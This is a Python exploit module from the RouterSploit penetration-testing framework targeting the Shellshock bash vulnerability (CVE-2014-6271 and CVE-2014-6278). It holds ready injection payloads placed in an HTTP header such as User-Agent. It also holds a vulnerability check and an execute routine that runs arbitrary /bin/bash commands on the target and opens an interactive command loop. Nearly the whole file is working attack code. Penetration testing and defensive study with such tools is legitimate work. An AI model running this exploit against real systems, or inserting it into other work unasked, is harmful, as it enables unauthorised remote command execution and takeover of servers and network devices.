import re
import string
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Shellshock",
        "description": "Exploits shellshock vulnerability that allows executing commands on operating system level.",
        "authors": (
            "Marcin Bury <marcin@threat9.com>",  # routersploit module
        ),
        "references": (
            "https://access.redhat.com/articles/1200223",
            "http://seclists.org/oss-sec/2014/q3/649",
            "http://blog.trendmicro.com/trendlabs-security-intelligence/shell-attack-on-your-server-bash-bug-cve-2014-7169-and-cve-2014-6271/",
        ),
        "devices": (
            "Multi",
        ),
    }
    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    path = OptString("/", "Url path")
    method = OptString("GET", "HTTP method")
    header = OptString("User-Agent", "HTTP header injection point")

    def __init__(self):
        self.payloads = [
            '() { :;};echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"',  # cve-2014-6271
            '() { _; } >_[$($())] { echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"; }',  # cve-2014-6278
        ]
        self.valid = None

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self)
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        marker = utils.random_text(32)
        injection = self.valid.replace("{{marker}}", marker).replace("{{cmd}}", cmd)

        headers = {
            self.header: injection,
        }

        response = self.http_request(
            method=self.method,
            path=self.path,
            headers=headers
        )

        if response is None:
            return

        regexp = "{}(.+?){}".format(marker, marker)
        res = re.findall(regexp, response.text, re.DOTALL)

        if len(res):
            return res[0]
        else:
            return ""

    @mute
    def check(self):
        number = int(utils.random_text(6, alph=string.digits))
        solution = number - 1
        cmd = "echo $(({}-1))".format(number)

        marker = utils.random_text(32)
        for payload in self.payloads:
            injection = payload.replace("{{marker}}", marker).replace("{{cmd}}", cmd)

            headers = {
                self.header: injection,
            }

            response = self.http_request(
                method=self.method,
                path=self.path,
                headers=headers
            )
            if response is None:
                continue

            if str(solution) in response.text:
                self.valid = payload
                return True  # target is vulnerable

        return False  # target not vulnerable
